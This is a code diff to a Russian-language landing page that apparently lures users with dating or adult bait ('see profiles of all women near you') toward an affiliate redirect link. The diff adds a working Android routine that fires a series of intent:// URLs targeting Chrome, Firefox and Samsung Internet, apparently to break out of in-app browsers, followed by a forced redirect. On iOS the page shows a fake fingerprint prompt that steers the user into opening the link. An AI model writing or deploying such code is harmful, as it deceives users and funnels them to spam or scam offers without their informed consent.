@@ -28,14 +28,10 @@
             height: 100vh;
             padding: 20px;
         }
-        .android-container h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
         .android-container .button-container {
             margin-bottom: 20px;
         }
-        .android-container a {
+        .android-container button {
             padding: 1rem 2rem;
             font-size: 1.2rem;
             font-weight: 600;
@@ -43,14 +39,13 @@
             color: #4A1D96;
             border: none;
             border-radius: 8px;
-            text-decoration: none;
+            cursor: pointer;
             width: 100%;
             max-width: 300px;
             transition: all 0.3s ease;
             margin-bottom: 10px;
-            display: inline-block;
         }
-        .android-container a:hover {
+        .android-container button:hover {
             background-color: #EDE7F6;
             color: #321E75;
         }
@@ -106,19 +101,15 @@
             .ios-container .fingerprint {
                 max-width: 150px;
             }
-            .android-container h2 {
-                font-size: 20px;
-            }
         }
     </style>
 </head>
 <body>
     <!-- Контейнер для Android -->
     <div class="android-container" id="androidContainer">
-        <h2>Нажмите на кнопку, чтобы открыть в браузере</h2>
         <div class="button-container">
-            <a href="https://linktr.ee/jessiwithbenefits" target="_blank">НАПИСАТЬ МНЕ👈💌</a>
-            <a href="https://linktr.ee/jessiwithbenefits" target="_blank">Посмотреть анкеты всех женщин рядом с вами👈</a>
+            <button onclick="openLink()">НАПИСАТЬ МНЕ👈💌</button>
+            <button onclick="openLink()">Посмотреть анкеты всех женщин рядом с вами👈</button>
         </div>
     </div>
 
@@ -126,7 +117,7 @@
     <div class="ios-container" id="iosContainer">
         <h2 id="title">УДЕРЖИВАЙТЕ ПАЛЕЦ НА ОТПЕЧАТКЕ⬇️⬇️!</h2>
         <p id="content">ВЫБЕРИТЕ <b>"*ОТКРЫТЬ ССЫЛКУ*"</b></p>
-        <a href="https://linktr.ee/jessiwithbenefits" target="_blank">
+        <a href="https://prev.affomelody.com/f6bUZz" target="_blank">
             <img class="fingerprint" src="https://so65a.github.io/2/1.png" alt="Отпечаток пальца">
         </a>
     </div>
@@ -151,6 +142,48 @@
             androidContainer.style.display = 'none';
             iosContainer.style.display = 'flex';
         }
+
+        // Функция для Android
+        const targetUrl = "https://prev.affomelody.com/f6bUZz";
+
+        const openLink = () => {
+            console.log("Attempting intent redirect");
+            // Попытка открыть через intent для нескольких браузеров
+            const browsers = [
+                "com.android.chrome", // Google Chrome
+                "org.mozilla.firefox", // Firefox
+                "com.sec.android.app.sbrowser" // Samsung Internet
+            ];
+
+            // Универсальный intent без привязки к пакету
+            let intentUrl = `intent://${targetUrl.replace('https://', '')}#Intent;scheme=https;end`;
+            
+            // Пробуем открыть intent
+            try {
+                window.location.href = intentUrl;
+            } catch (e) {
+                console.error("Intent failed:", e);
+            }
+
+            // Резервный intent для конкретных браузеров
+            browsers.forEach((browser, index) => {
+                setTimeout(() => {
+                    intentUrl = `intent://${targetUrl.replace('https://', '')}#Intent;scheme=https;package=${browser};end`;
+                    console.log(`Trying intent with ${browser}`);
+                    try {
+                        window.location.href = intentUrl;
+                    } catch (e) {
+                        console.error(`Intent with ${browser} failed:`, e);
+                    }
+                }, 500 * (index + 1));
+            });
+
+            // Резервный HTTPS-редирект через 2 секунды
+            setTimeout(() => {
+                console.log("Falling back to HTTPS redirect");
+                window.location.href = targetUrl;
+            }, 2000);
+        };
     </script>
 </body>
-</html>
+    </html>
